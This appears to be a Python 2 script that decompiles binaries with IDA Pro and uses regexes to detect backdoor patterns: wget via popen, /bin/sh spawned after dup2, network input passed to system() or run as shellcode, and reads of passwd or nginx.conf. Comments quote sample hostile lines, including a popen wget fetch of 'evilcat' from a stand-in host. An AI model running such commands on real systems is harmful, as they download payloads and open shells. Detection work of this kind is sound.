
import re
import time
import os
import sys
work_dir='D:\\source\\test1\\'
def ida_disassam(file_name,addr):	
	#idaw -Ohexrays:-errs:-mail=john@mail.com:outfile:ALL -A input
	#ida64.exe -Ohexrays:-errs:-mail=john@mail.com:3658:main -A  "D:\source\test1\install_dir\p_17\test_xcb_image_shm"
	file_dir=os.path.dirname(file_name)
	
	func_name_file=file_dir+'\\func_'+hex(addr)+'.c'
	if(os.path.isfile(func_name_file)==False):		
		cmd='ida64.exe -Ohexrays:-errs:-mail=john@mail.com:func_'+hex(addr)+':'+hex(addr)+' -A '+file_name
		print cmd
		os.system(cmd)
	
	myfile=open(func_name_file,'r')
	c_lines=[]
	for line in myfile.readlines():
		c_lines.append(line)
	return c_lines
	
#read share folder 
def get_analysis_funcs_addr_name(file_name):
	addrs=[]
	myfile=open(file_name,'r')
	for line in myfile.readlines():
		tmp_addr=int(line.split(' ')[0],16)
		tmp_name=line.split(' ')[1].strip('\n')
		addrs.append((tmp_addr,tmp_name))
	return addrs




def test_popen(mylog,file_name_path):
	global work_dir
	file_name=os.path.basename(file_name_path)
	p_dir=os.path.dirname(file_name_path).split('\\')[-1]
	addrs=get_analysis_funcs_addr_name(work_dir+'addrs\\'+p_dir+'\\'+file_name+'.popen')
	#addrs=get_analysis_funcs_addr_name(work_dir+'addrs\\'+file_name+'.popen')
	
	for addr_tuple in addrs:
		addr=addr_tuple[0]
		f = addr_tuple[1]
		if(f is not None ):
			test_func_flag=0
			mylog.write('start popen analysis func: '+f)
			print 'start popen analysis func: '+f,
			
			c_lines=ida_disassam(file_name_path,addr)
			
			if(len(c_lines)==0):
				print 'decompile_func error'
			else:
				for line in c_lines:
					#popen("cd /bin;wget -O evilcat http://myip.com/evilcat", "r");
					regex=re.search('popen\(.*wget',line)
					if regex:
						mylog.write(',yes\n')
						print ',yes'
						test_func_flag=1
						break
			if(test_func_flag==0):
				mylog.write(',no\n')
				print ',no'
#execl(path, "/bin/sh", 0LL);
def test_execl(mylog,file_name_path):
	global work_dir
	file_name=os.path.basename(file_name_path)
	p_dir=os.path.dirname(file_name_path).split('\\')[-1]
	addrs=get_analysis_funcs_addr_name(work_dir+'addrs\\'+p_dir+'\\'+file_name+'.execl')
	#addrs=get_analysis_funcs_addr_name(work_dir+'addrs\\'+file_name+'.system')
	
	for addr_tuple in addrs:
		addr=addr_tuple[0]
		f = addr_tuple[1]
		if(f is not None ):
			flag_out=0
			mylog.write('start execl analysis func: '+f)
			print 'start execl analysis func: '+f,
						
			c_lines=ida_disassam(file_name_path,addr)
			all_lines='\n'.join(c_lines)
			lines_num=len(c_lines)
			if(len(c_lines)==0):
				print 'decompile_func error'
			else:
				if(all_lines.find('dup2(')!=-1):
					recv_lines=[]
					taint_values=[]
					#1. find recv value
					for i in range(lines_num):
						if(flag_out):
							break
						#execl(path, "/bin/sh", 0LL);
						regex=re.search('execl\(.*"/bin/sh".*\)',c_lines[i])
						
						if regex:
							print regex.group()
							mylog.write(',yes\n')
							print ',yes'
							flag_out=1
							break					
					
					
			if(flag_out==0):
				mylog.write(',no\n')
				print ',no'	
#execl(path, "/bin/sh", 0LL);
def test_system1(mylog,file_name_path):
	global work_dir
	file_name=os.path.basename(file_name_path)
	p_dir=os.path.dirname(file_name_path).split('\\')[-1]
	addrs=get_analysis_funcs_addr_name(work_dir+'addrs\\'+p_dir+'\\'+file_name+'.system')
	#addrs=get_analysis_funcs_addr_name(work_dir+'addrs\\'+file_name+'.system')
	
	for addr_tuple in addrs:
		addr=addr_tuple[0]
		f = addr_tuple[1]
		if(f is not None ):
			flag_out=0
			mylog.write('start system1 analysis func: '+f)
			print 'start system1 analysis func: '+f,
						
			c_lines=ida_disassam(file_name_path,addr)
			all_lines='\n'.join(c_lines)
			lines_num=len(c_lines)
			if(len(c_lines)==0):
				print 'decompile_func error'
			else:
				if(all_lines.find('dup2(')!=-1):
					recv_lines=[]
					taint_values=[]
					#1. find recv value
					for i in range(lines_num):
						if(flag_out):
							break
						#execl(path, "/bin/sh", 0LL);
						regex=re.search('system\(.*"/bin/sh".*\)',c_lines[i])
						if regex:
							mylog.write(',yes\n')
							print ',yes'
							flag_out=1
							break					
					
					
			if(flag_out==0):
				mylog.write(',no\n')
				print ',no'							
def test_system(mylog,file_name_path):
	global work_dir
	file_name=os.path.basename(file_name_path)
	p_dir=os.path.dirname(file_name_path).split('\\')[-1]
	addrs=get_analysis_funcs_addr_name(work_dir+'addrs\\'+p_dir+'\\'+file_name+'.system')
	#addrs=get_analysis_funcs_addr_name(work_dir+'addrs\\'+file_name+'.system')
	
	for addr_tuple in addrs:
		addr=addr_tuple[0]
		f = addr_tuple[1]
		if(f is not None ):
			flag_out=0
			mylog.write('start system analysis func: '+f)
			print 'start system analysis func: '+f,
						
			c_lines=ida_disassam(file_name_path,addr)
			all_lines='\n'.join(c_lines)
			lines_num=len(c_lines)
			if(len(c_lines)==0):
				print 'decompile_func error'
			else:
				if(all_lines.find('recv(')!=-1):
					recv_lines=[]
					taint_values=[]
					#1. find recv value
					for i in range(lines_num):
						if(flag_out):
							break
						#if ( recv(v19, _5924fc070d840801bdbed7cbbbc52f3e, 0x7D0uLL, 0) < 0 )
						regex=re.search('recv\((.*), (?P<src>(.*)), (.*), .*\)',c_lines[i])
						if regex:
							recv_value=regex.group('src')
							recv_lines.append((i,recv_value))
							taint_values.append(recv_value)
					#2. find taint value from =
					for (tmp_i,tmp_recv_value) in recv_lines:
						for i in range(tmp_i,lines_num):
							#*v28 = _5924fc070d840801bdbed7cbbbc52f3e[0];
							#v30 = _5924fc070d840801bdbed7cbbbc52f3e;
							regex_recv=re.search('(?P<src>(.*)) = '+tmp_recv_value+'.*;',c_lines[i])
							if regex_recv:
								taint_value=regex_recv.group('src').strip(' ').strip('*')
								taint_values.append(taint_value)					
					#3. find system call 
					for taint_value1 in taint_values:
						if(flag_out==1):
							break
						#print taint_value1
						for (tmp_i,tmp_recv_value) in recv_lines:
							if(flag_out==1):
								break
							for i in range(tmp_i,lines_num):
								#system(_1b756b3aa8862d7730209615be62831e);
								regex_recv1=re.search('system\(.*'+taint_value1+'.*\)',c_lines[i])
								if regex_recv1:
									mylog.write(',yes\n')
									print ',yes'
									flag_out=1
									break					
					
					
			if(flag_out==0):
				mylog.write(',no\n')
				print ',no'					

def test_read(mylog,file_name_path):
	global work_dir
	file_name=os.path.basename(file_name_path)
	p_dir=os.path.dirname(file_name_path).split('\\')[-1]
	addrs=get_analysis_funcs_addr_name(work_dir+'addrs\\'+p_dir+'\\'+file_name+'.read')
	#addrs=get_analysis_funcs_addr_name(work_dir+'addrs\\'+file_name+'.system')
	
	for addr_tuple in addrs:
		addr=addr_tuple[0]
		f = addr_tuple[1]
		if(f is not None ):
			flag_out=0
			mylog.write('start read analysis func: '+f)
			print 'start read analysis func: '+f,
						
			c_lines=ida_disassam(file_name_path,addr)
			all_lines='\n'.join(c_lines)
			lines_num=len(c_lines)
			#if(all_lines.find('open(')!=-1 ):
			if(len(c_lines)==0):
				print 'decompile_func error'
			else:
				if(all_lines.find('open(')!=-1):
					recv_lines=[]
					taint_values=[]
					#1. find recv value
					for i in range(lines_num):
						if(flag_out):
							break
						#v14 = open("/usr/local/etc/nginx/nginx.conf", 0);
						#v15 = read(v14, _1b756b3aa8862d7730209615be62831e, 0x400uLL);
						regex=re.search('(?P<dst>(.*)) = open\("(?P<src>(.*))", .*\)',c_lines[i])
						if regex:
							file_name_open=regex.group('src')
							file_handle=regex.group('dst').strip(' ').strip('*')
							print 'file name open: '+file_name_open
							regex_file_name=re.search('(nginx\.conf|passwd)',file_name_open)
							if(regex_file_name):
								recv_lines.append((i,file_handle))
								taint_values.append(file_handle)
					#2. find taint value from =
					for (tmp_i,tmp_recv_value) in recv_lines:
						for i in range(0,tmp_i):
							
							#v14 = open("/usr/local/etc/nginx/nginx.conf", 0);
							regex_recv=re.search('(?P<src>(.*)) = '+tmp_recv_value+'.*;',c_lines[i])
							if regex_recv:
								taint_value=regex_recv.group('src').strip(' ').strip('*')
								taint_values.append(taint_value)					
					#3. find system call 
					for taint_value1 in taint_values:
						if(flag_out==1):
							break
						#print taint_value1
						for (tmp_i,tmp_recv_value) in recv_lines:
							if(flag_out==1):
								break
							for i in range(tmp_i,lines_num):
								#v15 = read(v14, _1b756b3aa8862d7730209615be62831e, 0x400uLL);
								regex_recv1=re.search('read\(.*'+taint_value1+', (.*), .*\)',c_lines[i])
								if regex_recv1:
									mylog.write(',yes\n')
									print ',yes'
									flag_out=1
									break					
					
					
			if(flag_out==0):
				mylog.write(',no\n')
				print ',no'	

def test_recv_shellcode(mylog,file_name_path):
	global work_dir
	file_name=os.path.basename(file_name_path)
	p_dir=os.path.dirname(file_name_path).split('\\')[-1]
	addrs=get_analysis_funcs_addr_name(work_dir+'addrs\\'+p_dir+'\\'+file_name+'.recv')
	
	for addr_tuple in addrs:
		addr=addr_tuple[0]
		f = addr_tuple[1]
		if(f is not None ):
			flag_out=0
			mylog.write('start recv_shellcode analysis func: '+f)
			print 'start recv_shellcode analysis func: '+f
			
			#c_lines=decompile_func(addr)
			c_lines=ida_disassam(file_name_path,addr)
			lines_num=len(c_lines)
			#all_lines='\n'.join(c_lines)
			if(len(c_lines)==0):
				print 'decompile_func error'
			else:
				recv_lines=[]
				taint_values=[]
				#1. find recv value
				for i in range(lines_num):
					if(flag_out):
						break
					#if ( recv(v19, _5924fc070d840801bdbed7cbbbc52f3e, 0x7D0uLL, 0) < 0 )
					regex=re.search('recv\((.*), (?P<src>(.*)), (.*), .*\)',c_lines[i])
					if regex:
						recv_value=regex.group('src')
						index_1=recv_value.find('*')
						if(index_1!=-1):
							recv_value=recv_value[index_1+1:]
						print str(i),recv_value
						recv_lines.append((i,recv_value))
						taint_values.append(recv_value)
						#print recv_value
				#2. find taint value from =
				for (tmp_i,tmp_recv_value) in recv_lines:
					for i in range(tmp_i,lines_num):
						#*v28 = _5924fc070d840801bdbed7cbbbc52f3e[0];
						#v30 = _5924fc070d840801bdbed7cbbbc52f3e;
						regex_recv=re.search('(?P<src>(.*)) = '+tmp_recv_value+'.*;',c_lines[i])
						if regex_recv:
							taint_value=regex_recv.group('src').strip(' ').strip('*')
							taint_values.append(taint_value)
				
				#3. find call shellcode
				for taint_value1 in taint_values:
					if(flag_out==1):
						break
					#print taint_value1
					for (tmp_i,tmp_recv_value) in recv_lines:
						if(flag_out==1):
							break
						for i in range(tmp_i,lines_num):
							#((void (__fastcall *)(_DWORD *, char *, signed __int64, signed __int64))v28)(v34, v35, v31, v33);
							regex_recv1=re.search('call \*\).*'+taint_value1+'.*;',c_lines[i])
							if regex_recv1:
								mylog.write(',yes\n')
								print ',yes'
								flag_out=1
								break
			if(flag_out==0):
				mylog.write(',no\n')
				print ',no'
def main(file_name_path):
	global work_dir
	base_name=os.path.basename(file_name_path)
	p_dir=os.path.dirname(file_name_path).split('\\')[-1]
	output_dir=work_dir+'output\\'+p_dir+'\\'
	try:
		os.makedirs(output_dir,0777)
	except:
		print 'dir already exists'
		
	print 'start analysis'		
	mylog=open(output_dir+base_name+'.output','w')
	print 'start popen analysis'	
	test_popen(mylog,file_name_path)
	print 'start system analysis'
	test_system(mylog,file_name_path)
	test_system1(mylog,file_name_path)
	print 'start recv_shellcode analysis'	
	test_recv_shellcode(mylog,file_name_path)
	print 'start read analysis'
	test_read(mylog,file_name_path)
	print 'start execl analysis'
	test_execl(mylog,file_name_path)
	mylog.close()
	print 'ok'
	#idc.Exit(0)


    
if(len(sys.argv)!=2):
	print "python test_detect.py file_name"
file_name_arg=sys.argv[1]
print file_name_arg

#main(file_name_arg)